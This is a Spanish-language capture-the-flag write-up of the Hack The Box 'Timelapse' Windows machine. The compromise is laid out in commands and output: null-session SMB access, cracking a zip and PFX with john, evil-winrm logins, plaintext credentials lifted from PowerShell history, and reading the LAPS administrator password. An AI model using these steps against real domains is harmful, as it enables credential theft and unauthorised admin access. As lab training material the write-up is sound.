---
title: Hack The Box Timelapse
author: k4miyo
date: 2023-07-16
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Network, Active Directory, Common Services, SMB, LAPS, Powershell, Reconnaissance, Password Cracking, Group Membership, Misconfiguration, Anonymous/Guest Access]
ping: true
---

## Máquina Timelapse
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.11.152.

```bash
❯ ping -c 1 10.10.11.152
PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.
64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=161 ms

--- 10.10.11.152 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 160.762/160.762/160.762/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.11.152 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 20:20 CST
Initiating Parallel DNS resolution of 1 host. at 20:20
Completed Parallel DNS resolution of 1 host. at 20:20, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:20
Scanning 10.10.11.152 [65535 ports]
Discovered open port 139/tcp on 10.10.11.152
Discovered open port 135/tcp on 10.10.11.152
Discovered open port 445/tcp on 10.10.11.152
Discovered open port 53/tcp on 10.10.11.152
Discovered open port 389/tcp on 10.10.11.152
Discovered open port 593/tcp on 10.10.11.152
Discovered open port 5986/tcp on 10.10.11.152
Discovered open port 49674/tcp on 10.10.11.152
Discovered open port 49673/tcp on 10.10.11.152
Discovered open port 49696/tcp on 10.10.11.152
Discovered open port 49667/tcp on 10.10.11.152
Discovered open port 464/tcp on 10.10.11.152
Discovered open port 55723/tcp on 10.10.11.152
Discovered open port 9389/tcp on 10.10.11.152
Discovered open port 3269/tcp on 10.10.11.152
Discovered open port 3268/tcp on 10.10.11.152
Discovered open port 88/tcp on 10.10.11.152
Discovered open port 636/tcp on 10.10.11.152
Completed SYN Stealth Scan at 20:20, 26.46s elapsed (65535 total ports)
Nmap scan report for 10.10.11.152
Host is up, received user-set (0.14s latency).
Scanned at 2023-07-06 20:20:00 CST for 27s
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
55723/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
           Raw packets sent: 131064 (5.767MB) | Rcvd: 30 (1.320KB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.152
   5   │     [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,55723
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,55723 10.10.11.152 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 20:22 CST
Nmap scan report for 10.10.11.152
Host is up (0.15s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-07-07 10:22:20Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2023-07-07T10:23:53+00:00; +7h59m59s from scanner time.
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
55723/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-time: 
|   date: 2023-07-07T10:23:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.41 seconds
```

Vemos varios puertos abiertos, vamos a tratar de ver que recursos podemos observar bajo el servicio SMB con una ***null session***:

```bash
❯ smbclient -L //10.10.11.152/ -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```

Podemos acceder al recurso `Shares`:

```bash
❯ smbclient //10.10.11.152/Shares -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 10:39:15 2021
  ..                                  D        0  Mon Oct 25 10:39:15 2021
  Dev                                 D        0  Mon Oct 25 14:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021

		6367231 blocks of size 4096. 1255166 blocks available
smb: \>
```

Para trabajar más cómodos, vamos a crearnos una montura del recurso compartido.

```bash
❯ mkdir /mnt/timelapse
❯ mount -t cifs //10.10.11.152/Shares /mnt/timelapse -o username='null',password='',rw
❯ cd /mnt/timelapse
❯ dir
Dev  HelpDesk
❯ tree
.
├── Dev
│   └── winrm_backup.zip
└── HelpDesk
    ├── LAPS_Datasheet.docx
    ├── LAPS_OperationsGuide.docx
    ├── LAPS_TechnicalSpecification.docx
    └── LAPS.x64.msi

2 directories, 5 files
```

Vemos algunos recursos, vamos a llevarlos a nuestra máquina de atacante para echarles un ojo:

```bash
❯ cp -r * /home/k4miyo/Documents/HackTheBox/Timelapse/content/.
❯ cd !$
cd /home/k4miyo/Documents/HackTheBox/Timelapse/content/.
❯ umount /mnt/timelapse
❯ ll
drwxr-xr-x root root  32 B Thu Jul  6 20:48:48 2023  Dev
drwxr-xr-x root root 176 B Thu Jul  6 20:48:53 2023  HelpDesk
```

En el directorio `Dev` , tenemos un archivo comprimido `winrm_backup.zip`, vamos  a tratar de crackear la contraseña con `zip2john` y `john`:

```bash
❯ zip2john winrm_backup.zip > hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2023-07-16 19:19) 2.222g/s 7718Kp/s 7718Kc/s 7718KC/s swifer..supergay01
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Vamos a tratar de extraer el contenido del archivo:

```bash
❯ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
❯ ll
.rw-r--r-- root   root   4.9 KB Sun Jul 16 19:19:01 2023  hash
.rwxr-xr-x root   root   2.5 KB Mon Oct 25 09:21:20 2021  legacyy_dev_auth.pfx
.rwxr-xr-x k4miyo k4miyo 2.5 KB Thu Jul  6 20:48:48 2023  winrm_backup.zip
```

Encontramos el archivo `legacyy_dev_auth.pfx`, el cual es ***Personal Information Exchange***. Vamos a utilizar [pfx2john](https://raw.githubusercontent.com/sirrushoo/python/master/pfx2john.py) para obtener la clave del archivo:

```bash
❯ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/pfx2john.py
--2023-07-16 20:19:34--  https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/pfx2john.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3329 (3.3K) [text/plain]
Saving to: ‘pfx2john.py’

pfx2john.py                                     100%[====================================================================================================>]   3.25K  --.-KB/s    in 0s      

2023-07-16 20:19:37 (54.4 MB/s) - ‘pfx2john.py’ saved [3329/3329]

❯ python3 pfx2john.py
Usage: pfx2john.py <.pfx file(s)>
❯ python3 pfx2john.py legacyy_dev_auth.pfx > hashed
```

Ahora con la herramienta `john` tratamos de encontrar la contraseña:

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hashed
Using default input encoding: UTF-8
Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:00:17 DONE (2023-07-16 20:24) 0.05817g/s 188001p/s 188001c/s 188001C/s thyriana..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ahora que tenemos la contraseña, podemos generar las llaves:

```bash
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx.crt
Enter Import Password:
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

Ahora ya tenemos los archivos para conectarnos a la máquina con `evil-winrm`:

```bash
❯ evil-winrm -i 10.10.11.152 -c ./pfx.crt -k ./priv.key -p -u -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents>
```

Ya nos encontramos dentro de la máquina como el usuario **legacyy** y podemos visualizar la flag (user.txt). Ahora debemos encontrar una forma de escalar privilegios, así que vamos a enumerar un poco el sistema:

```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> whoami /priv
Enter PEM pass phrase:

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\legacyy\Desktop>
```

No vemos algún permiso interesante, así que vamos a tratar de ver el historial de comandos de powershell del usuario bajo la ruta `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` de acuerdo con el artículo [powershell-history-file](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html):

```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> dir


    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt


*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>
```

Vemos una conexión utilizando el usuario **svc_deploy**, así que vamos a tratar de acceder como dicho usuario:

```bash
❯ evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

Ya nos encontramos dentro de la máquina como el usuario **svc_deploy**. Vamos a enumerar un poco el sistema con el nuevo usuario:

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

El usuario se encuentra en el grupo **LAPS_Readers**. Con LAPS, el DC administra las contraseñas de administrador local para las computadoras en el dominio. Es común crear un grupo de usuarios y darles permisos para leer estas contraseñas, permitiendo que los administradores de confianza accedan a todas las contraseñas de los administradores locales. 

Para leer la contraseña de LAPS, se necesita el comando `Get-ADComputer` e indicar la propiedad `ms-mcs-admpwd`:

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : $@267}9a!Td}2/58tm.3hAFJ
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :



*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

Vemos la contraseña del usuario administrador, así que vamos a validarlas con la herramienta `evil-winrm`:

```bash
❯ evil-winrm -i 10.10.11.152 -u 'administrator' -p '$@267}9a!Td}2/58tm.3hAFJ' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Ya nos encontramos dentro de la máquina como el usuario **administrator** y podemos visualizar la flag (root.txt) la cual se encuentra en el directorio **TRX**.
